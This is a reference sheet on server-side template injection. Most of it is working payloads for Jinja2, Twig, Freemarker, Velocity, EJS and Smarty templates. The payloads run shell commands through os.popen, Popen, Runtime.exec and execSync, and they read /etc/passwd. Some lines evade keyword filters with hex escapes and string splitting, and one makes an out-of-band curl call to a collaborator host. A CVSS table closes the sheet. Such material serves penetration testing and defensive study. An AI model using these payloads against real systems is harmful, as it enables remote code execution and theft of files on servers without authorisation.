# Server-Side Template Injection (SSTI): Complete Reference

## Detection Phase

### Template Syntax Detection
```bash
# Smarty/Handlebars/Django
{{7*7}}

# Jinja2/Twig
{{7*'7'}} -> {{49}}

# Freemarker (Java)
${7*7}

# Velocity (Java)
#set($x = 7*7) $x

# ERB (Ruby)
<%= 7*7 %>

# EJS (Node.js)
<%= 7*7 %>
<%- 7*7 %>

# Jade/Pug
= 7*7

# Razor (.NET)
@(7*7)
```

### Blind Detection (time-based)
```bash
# Jinja2
{{''.__class__.__mro__[2].__subclasses__()}}

# Blind timing
{{config.__class__.__init__.__globals__["os"].popen("sleep 5").read()}}

# Out-of-band detection
{{config.__class__.__init__.__globals__["os"].popen("curl http://COLLABORATOR.oastify.com").read()}}
```

## Jinja2 Exploitation

### RCE Basic
```python
# Read file
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find subprocess.Popen
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate()[0] }}
  {% endif %}
{% endfor %}

# Direct method
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Jinja2 Bypass Filters
```python
# Bypass string blacklists
{{ ()|attr('__cla'+'ss__') }}
{{ ()|attr('\x5f\x5fcla\x73\x73\x5f\x5f') }}

# Bypass [ and ] blacklist
{{ ''|attr('\x5f\x5fcla\x73\x73\x5f\x5f') }}

# Using request object
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Using lipsum
{{ lipsum.__globals__["os"].popen("id").read() }}

# Using cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### Jinja2 Sandbox Escape
```python
# MRO chain
''.__class__ -> <class 'str'>
''.__class__.__mro__ -> [<class 'str'>, <class 'object'>]
''.__class__.__mro__[1].__subclasses__() -> [<class 'type'>, ...]

# Common useful classes
# <class '_io.TextIOWrapper'> (file read)
# <class 'subprocess.Popen'> (RCE)
# <class 'os.wrap_close'> (os access)
# <class 'warnings.catch_warnings'> (builtins access)
```

## Twig Exploitation

```bash
# Basic RCE
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

# File read
{{ _self.env.registerUndefinedFilterCallback("file_get_contents") }}
{{ _self.env.getFilter("/etc/passwd") }}
```

## Freemarker Exploitation

```bash
# RCE via new()
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign clazz.getMethod("getRuntime").invoke(null).exec("id")>

# String built-in
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity Exploitation

```java
#set($e="exp")
#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id"))
$x.waitFor()

# Direct RCE
#set($x = $e.getClass().forName("java.lang.Runtime").getMethod("exec","java.lang.String"))
$x.invoke($x.invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime"),null),"id")
```

## EJS Exploitation

```javascript
// RCE
<%= global.process.mainModule.require('child_process').execSync('id') %>

// File read
<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd') %>

// Using settings
<%= settings.views %>

// Deep require access
<%= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>
```

## Smarty Exploitation

```php
// PHP execution
{php}echo system('id');{/php}

// Template object access
{self::getStreamVariable('file:///etc/passwd')}
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| SSTI leading to RCE | 9.8 | Network, Low, No auth, Full impact |
| SSTI leading to file read | 7.5 | Network, Low, No auth, Confidentiality high |
| SSTI leading to XSS | 6.1 | Network, Low, User interaction |
| Blind SSTI with out-of-band detection | 7.5 | Network, Low, No auth, Changed scope |